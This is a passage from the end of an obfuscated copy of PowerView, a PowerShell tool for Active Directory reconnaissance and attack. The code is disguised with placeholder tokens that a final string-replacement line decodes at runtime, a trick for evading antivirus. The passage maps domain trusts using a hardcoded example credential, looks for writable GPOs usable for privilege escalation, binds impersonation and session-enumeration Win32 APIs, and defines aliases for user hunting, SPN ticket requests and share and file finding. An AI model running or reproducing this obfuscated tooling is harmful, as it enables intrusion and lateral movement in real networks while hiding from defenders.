RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainTrustMapping -Server q4gUPRIMARY.testlab.localq4gU wZ5t Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries
using the specified alternate credentials, and output everything to a .csv file.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.DomainTrust.NETq4gU)]
    [OutputType(q4gUPowerView.DomainTrust.LDAPq4gU)]
    [OutputType(q4gUPowerView.DomainTrust.APIq4gU)]
    [CmdletBinding(DefaultParameterSetName = q4gULDAPq4gU)]
    Param(
        [Parameter(ParameterSetName = q4gUAPIq4gU)]
        [Switch]
        RaUAPI,

        [Parameter(ParameterSetName = q4gUNETq4gU)]
        [Switch]
        RaUNET,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [Parameter(ParameterSetName = q4gUAPIq4gU)]
        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [Switch]
        RaUTombstone,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    # keep track of domains seen so we donq4gUt hit infinite recursion
    RaUSeenDomains = @{}

    # our domain status tracker
    RaUDomains = New-Object System.Collections.Stack

    RaUDomainTrustArguments = @{}
    if (RaUPSBoundParameters[q4gUAPIq4gU]) { RaUDomainTrustArguments[q4gUAPIq4gU] = RaUAPI }
    if (RaUPSBoundParameters[q4gUNETq4gU]) { RaUDomainTrustArguments[q4gUNETq4gU] = RaUNET }
    if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaUDomainTrustArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
    if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUDomainTrustArguments[q4gUPropertiesq4gU] = RaUProperties }
    if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUDomainTrustArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
    if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUDomainTrustArguments[q4gUServerq4gU] = RaUServer }
    if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUDomainTrustArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
    if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUDomainTrustArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
    if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUDomainTrustArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
    if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUDomainTrustArguments[q4gUTombstoneq4gU] = RaUTombstone }
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUDomainTrustArguments[q4gUCredentialq4gU] = RaUCredential }

    # get the current domain and push it onto the stack
    if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
        RaUCurrentDomain = (Get-Domain -Credential RaUCredential).Name
    }
    else {
        RaUCurrentDomain = (Get-Domain).Name
    }
    RaUDomains.Push(RaUCurrentDomain)

    while(RaUDomains.Count -ne 0) {

        RaUDomain = RaUDomains.Pop()

        # if we havenq4gUt seen this domain before
        if (RaUDomain -and (RaUDomain.Trim() -ne q4gUq4gU) -and (-not RaUSeenDomains.ContainsKey(RaUDomain))) {

            Write-Verbose Oj8X[Get-DomainTrustMapping] Enumerating trusts for domain: q4gURaUDomainq4gUOj8X

            # mark it as seen in our list
            RaUNull = RaUSeenDomains.Add(RaUDomain, q4gUq4gU)

            try {
                # get all the trusts for this domain
                RaUDomainTrustArguments[q4gUDomainq4gU] = RaUDomain
                RaUTrusts = Get-DomainTrust @DomainTrustArguments

                if (RaUTrusts -isnot [System.Array]) {
                    RaUTrusts = @(RaUTrusts)
                }

                # get any forest trusts, if they exist
                if (RaUPsCmdlet.ParameterSetName -eq q4gUNETq4gU) {
                    RaUForestTrustArguments = @{}
                    if (RaUPSBoundParameters[q4gUForestq4gU]) { RaUForestTrustArguments[q4gUForestq4gU] = RaUForest }
                    if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUForestTrustArguments[q4gUCredentialq4gU] = RaUCredential }
                    RaUTrusts += Get-ForestTrust @ForestTrustArguments
                }

                if (RaUTrusts) {
                    if (RaUTrusts -isnot [System.Array]) {
                        RaUTrusts = @(RaUTrusts)
                    }

                    # enumerate each trust found
                    ForEach (RaUTrust in RaUTrusts) {
                        if (RaUTrust.SourceName -and RaUTrust.TargetName) {
                            # make sure we process the target
                            RaUNull = RaUDomains.Push(RaUTrust.TargetName)
                            RaUTrust
                        }
                    }
                }
            }
            catch {
                Write-Verbose Oj8X[Get-DomainTrustMapping] Error: RaU_Oj8X
            }
        }
    }
}


function Get-GPODelegation {
<#
.SYNOPSIS

Finds users with write permissions on GPO objects which may allow privilege escalation within the domain.

Author: Itamar Mizrahi (@MrAnde7son)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER GPOName

The GPO display name to query for, wildcards accepted.

.PARAMETER PageSize

Specifies the PageSize to set for the LDAP searcher object.

.EXAMPLE

Get-GPODelegation

Returns all GPO delegations in current forest.

.EXAMPLE

Get-GPODelegation -GPOName

Returns all GPO delegations on a given GPO.
#>

    [CmdletBinding()]
    Param (
        [String]
        RaUGPOName = q4gU*q4gU,

        [ValidateRange(1,10000)] 
        [Int]
        RaUPageSize = 200
    )

    RaUExclusions = @(q4gUSYSTEMq4gU,q4gUDomain Adminsq4gU,q4gUEnterprise Adminsq4gU)

    RaUForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    RaUDomainList = @(RaUForest.Domains)
    RaUDomains = RaUDomainList wZ5t foreach { RaU_.GetDirectoryEntry() }
    foreach (RaUDomain in RaUDomains) {
        RaUFilter = Oj8X(&(objectCategory=groupPolicyContainer)(displayname=RaUGPOName))Oj8X
        RaUSearcher = New-Object System.DirectoryServices.DirectorySearcher
        RaUSearcher.SearchRoot = RaUDomain
        RaUSearcher.Filter = RaUFilter
        RaUSearcher.PageSize = RaUPageSize
        RaUSearcher.SearchScope = Oj8XSubtreeOj8X
        RaUlistGPO = RaUSearcher.FindAll()
        foreach (RaUgpo in RaUlistGPO){
            RaUACL = ([ADSI]RaUgpo.path).ObjectSecurity.Access wZ5t ? {RaU_.ActiveDirectoryRights -match Oj8XWriteOj8X -and RaU_.AccessControlType -eq Oj8XAllowOj8X -and  RaUExclusions -notcontains RaU_.IdentityReference.toString().split(Oj8XScKjOj8X)[1] -and RaU_.IdentityReference -ne Oj8XCREATOR OWNEROj8X}
        if (RaUACL -ne RaUnull){
            RaUGpoACL = New-Object psobject
            RaUGpoACL wZ5t Add-Member Noteproperty q4gUADSPathq4gU RaUgpo.Properties.adspath
            RaUGpoACL wZ5t Add-Member Noteproperty q4gUGPODisplayNameq4gU RaUgpo.Properties.displayname
            RaUGpoACL wZ5t Add-Member Noteproperty q4gUIdentityReferenceq4gU RaUACL.IdentityReference
            RaUGpoACL wZ5t Add-Member Noteproperty q4gUActiveDirectoryRightsq4gU RaUACL.ActiveDirectoryRights
            RaUGpoACL
        }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect.
# Warning: Once these are executed, they are baked in
# and canq4gUt be changed while the script is running!
#
########################################################

RaUMod = New-InMemoryModule -ModuleName Win32

# [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSAvoidUsingPositionalParametersq4gU, Scope=q4gUFunctionq4gU, Target=q4gUpsenumq4gU)]

# used to parse the q4gUsamAccountTypeq4gU property for users/computers/groups
RaUSamAccountTypeEnum = psenum RaUMod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   q4gU0x00000000q4gU
    GROUP_OBJECT                    =   q4gU0x10000000q4gU
    NON_SECURITY_GROUP_OBJECT       =   q4gU0x10000001q4gU
    ALIAS_OBJECT                    =   q4gU0x20000000q4gU
    NON_SECURITY_ALIAS_OBJECT       =   q4gU0x20000001q4gU
    USER_OBJECT                     =   q4gU0x30000000q4gU
    MACHINE_ACCOUNT                 =   q4gU0x30000001q4gU
    TRUST_ACCOUNT                   =   q4gU0x30000002q4gU
    APP_BASIC_GROUP                 =   q4gU0x40000000q4gU
    APP_QUERY_GROUP                 =   q4gU0x40000001q4gU
    ACCOUNT_TYPE_MAX                =   q4gU0x7fffffffq4gU
}

# used to parse the q4gUgrouptypeq4gU property for groups
RaUGroupTypeEnum = psenum RaUMod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   q4gU0x00000001q4gU
    GLOBAL_SCOPE                    =   q4gU0x00000002q4gU
    DOMAIN_LOCAL_SCOPE              =   q4gU0x00000004q4gU
    UNIVERSAL_SCOPE                 =   q4gU0x00000008q4gU
    APP_BASIC                       =   q4gU0x00000010q4gU
    APP_QUERY                       =   q4gU0x00000020q4gU
    SECURITY                        =   q4gU0x80000000q4gU
} -Bitfield

# used to parse the q4gUuserAccountControlq4gU property for users/groups
RaUUACEnum = psenum RaUMod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield

# enum used by RaUWTS_SESSION_INFO_1 below
RaUWTSConnectState = psenum RaUMod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
RaUWTS_SESSION_INFO_1 = struct RaUMod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 RaUWTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @(q4gULPWStrq4gU)
    pHostName = field 4 String -MarshalAs @(q4gULPWStrq4gU)
    pUserName = field 5 String -MarshalAs @(q4gULPWStrq4gU)
    pDomainName = field 6 String -MarshalAs @(q4gULPWStrq4gU)
    pFarmName = field 7 String -MarshalAs @(q4gULPWStrq4gU)
}

# the particular WTSQuerySessionInformation result structure
RaUWTS_CLIENT_ADDRESS = struct RaUmod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @(q4gUByValArrayq4gU, 20)
}

# the NetShareEnum result structure
RaUSHARE_INFO_1 = struct RaUMod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @(q4gULPWStrq4gU)
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @(q4gULPWStrq4gU)
}

# the NetWkstaUserEnum result structure
RaUWKSTA_USER_INFO_1 = struct RaUMod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @(q4gULPWStrq4gU)
    LogonDomain = field 1 String -MarshalAs @(q4gULPWStrq4gU)
    AuthDomains = field 2 String -MarshalAs @(q4gULPWStrq4gU)
    LogonServer = field 3 String -MarshalAs @(q4gULPWStrq4gU)
}

# the NetSessionEnum result structure
RaUSESSION_INFO_10 = struct RaUMod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @(q4gULPWStrq4gU)
    UserName = field 1 String -MarshalAs @(q4gULPWStrq4gU)
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}

# enum used by RaULOCALGROUP_MEMBERS_INFO_2 below
RaUSID_NAME_USE = psenum RaUMod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}

# the NetLocalGroupEnum result structure
RaULOCALGROUP_INFO_1 = struct RaUMod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @(q4gULPWStrq4gU)
    lgrpi1_comment = field 1 String -MarshalAs @(q4gULPWStrq4gU)
}

# the NetLocalGroupGetMembers result structure
RaULOCALGROUP_MEMBERS_INFO_2 = struct RaUMod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 RaUSID_NAME_USE
    lgrmi2_domainandname = field 2 String -MarshalAs @(q4gULPWStrq4gU)
}

# enums used in DS_DOMAIN_TRUSTS
RaUDsDomainFlag = psenum RaUMod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
RaUDsDomainTrustType = psenum RaUMod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
RaUDsDomainTrustAttributes = psenum RaUMod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}

# the DsEnumerateDomainTrusts result structure
RaUDS_DOMAIN_TRUSTS = struct RaUMod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @(q4gULPWStrq4gU)
    DnsDomainName = field 1 String -MarshalAs @(q4gULPWStrq4gU)
    Flags = field 2 RaUDsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 RaUDsDomainTrustType
    TrustAttributes = field 5 RaUDsDomainTrustAttributes
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}

# used by WNetAddConnection2W
RaUNETRESOURCEW = struct RaUMod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @(q4gULPWStrq4gU)
    lpRemoteName =    field 5 String -MarshalAs @(q4gULPWStrq4gU)
    lpComment =       field 6 String -MarshalAs @(q4gULPWStrq4gU)
    lpProvider =      field 7 String -MarshalAs @(q4gULPWStrq4gU)
}

# all of the Win32 API functions we need
RaUFunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @(RaUNETRESOURCEW, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)

RaUTypes = RaUFunctionDefinitions wZ5t Add-Win32Type -Module RaUMod -Namespace q4gUWin32q4gU
RaUNetapi32 = RaUTypes[q4gUnetapi32q4gU]
RaUAdvapi32 = RaUTypes[q4gUadvapi32q4gU]
RaUWtsapi32 = RaUTypes[q4gUwtsapi32q4gU]
RaUMpr = RaUTypes[q4gUMprq4gU]
RaUKernel32 = RaUTypes[q4gUkernel32q4gU]

Set-Alias Get-IPAddress Resolve-IPAddress
Set-Alias Convert-NameToSid ConvertTo-SID
Set-Alias Convert-SidToName ConvertFrom-SID
Set-Alias Request-SPNTicket Get-DomainSPNTicket
Set-Alias Get-DNSZone Get-DomainDNSZone
Set-Alias Get-DNSRecord Get-DomainDNSRecord
Set-Alias Get-NetDomain Get-Domain
Set-Alias Get-NetDomainController Get-DomainController
Set-Alias Get-NetForest Get-Forest
Set-Alias Get-NetForestDomain Get-ForestDomain
Set-Alias Get-NetForestCatalog Get-ForestGlobalCatalog
Set-Alias Get-NetUser Get-DomainUser
Set-Alias Get-UserEvent Get-DomainUserEvent
Set-Alias Get-NetComputer Get-DomainComputer
Set-Alias Get-ADObject Get-DomainObject
Set-Alias Set-ADObject Set-DomainObject
Set-Alias Get-ObjectAcl Get-DomainObjectAcl
Set-Alias Add-ObjectAcl Add-DomainObjectAcl
Set-Alias Invoke-ACLScanner Find-InterestingDomainAcl
Set-Alias Get-GUIDMap Get-DomainGUIDMap
Set-Alias Get-NetOU Get-DomainOU
Set-Alias Get-NetSite Get-DomainSite
Set-Alias Get-NetSubnet Get-DomainSubnet
Set-Alias Get-NetGroup Get-DomainGroup
Set-Alias Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
Set-Alias Get-NetGroupMember Get-DomainGroupMember
Set-Alias Get-NetFileServer Get-DomainFileServer
Set-Alias Get-DFSshare Get-DomainDFSShare
Set-Alias Get-NetGPO Get-DomainGPO
Set-Alias Get-NetGPOGroup Get-DomainGPOLocalGroup
Set-Alias Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
Set-Alias Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
Set-Alias Get-LoggedOnLocal Get-RegLoggedOn
Set-Alias Invoke-CheckLocalAdminAccess Test-AdminAccess
Set-Alias Get-SiteName Get-NetComputerSiteName
Set-Alias Get-Proxy Get-WMIRegProxy
Set-Alias Get-LastLoggedOn Get-WMIRegLastLoggedOn
Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLocation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
').('ScKj',[][]92).(([]119+[]90+[]53+[]116),'|').('q4gU',[][]39).(([]121+[]74+[]106+[]48),'`').('Oj8X',[][]34).(([]82+[]97+[]85),[][]36))